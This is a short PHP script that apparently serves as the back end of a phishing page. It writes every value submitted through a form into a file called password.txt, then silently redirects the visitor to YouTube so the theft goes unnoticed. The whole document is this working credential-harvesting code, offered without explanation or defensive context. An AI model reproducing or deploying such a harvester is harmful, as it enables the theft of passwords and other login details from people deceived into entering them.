<?php
header("Location:https://www.youtube.com/ ");
$handle = fopen("password.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 